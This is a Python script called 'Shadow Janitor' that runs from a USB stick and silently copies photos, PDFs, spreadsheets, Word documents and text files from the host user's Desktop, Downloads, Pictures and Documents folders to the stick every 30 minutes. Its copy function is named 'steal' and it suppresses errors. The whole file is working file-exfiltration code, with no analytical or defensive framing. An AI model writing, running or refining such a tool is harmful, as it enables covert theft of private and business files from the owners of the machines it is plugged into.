import os
import shutil
import time
import sys

# Determine where we are running from (the stick)
STICK_ROOT = os.path.dirname(os.path.abspath(__file__))
TRANSFER_ZONE = os.path.join(STICK_ROOT, '_transfer_zone')
EXT = {'.jpg','.png','.heic','.pdf','.csv','.xlsx','.docx','.txt'}

def steal(source, destination):
    if not os.path.exists(source): return
    print(f"Scanning {source}...")
    
    count = 0
    for root, dirs, files in os.walk(source):
        # Skip the stick itself to avoid recursive copying
        if STICK_ROOT in os.path.abspath(root):
            continue
            
        for f in files:
            if f.lower().endswith(tuple(EXT)):
                try:
                    # Check if file already exists to avoid redundant copies
                    dest_file = os.path.join(destination, f)
                    if not os.path.exists(dest_file):
                        shutil.copy2(os.path.join(root,f), dest_file)
                        count += 1
                except: pass
    return count

def main():
    print("--- 👤 Shadow Janitor (Background Mode) ---")
    print(f"Destination: {TRANSFER_ZONE}")
    print("Running in silent background mode...")
    
    # Target folders on the host machine
    home = os.path.expanduser("~")
    targets = ['Desktop', 'Downloads', 'Pictures', 'Documents']
    
    while True:
        stamp = time.strftime('%Y%m%d_%H%M')
        dest_dir = os.path.join(TRANSFER_ZONE, f"shadow_{stamp}")
        
        total_copied = 0
        for t in targets:
            source_path = os.path.join(home, t)
            if os.path.exists(source_path):
                # Create destination only if source exists
                if not os.path.exists(dest_dir):
                    os.makedirs(dest_dir, exist_ok=True)
                total_copied += steal(source_path, dest_dir)
        
        if total_copied > 0:
            print(f"[{time.strftime('%H:%M:%S')}] ✅ Sync complete. {total_copied} files secured.")
        else:
            # Clean up empty directory if no files were copied
            if os.path.exists(dest_dir) and not os.listdir(dest_dir):
                os.rmdir(dest_dir)

        # Sleep for 30 minutes between scans
        time.sleep(1800)

if __name__ == "__main__":
    main()
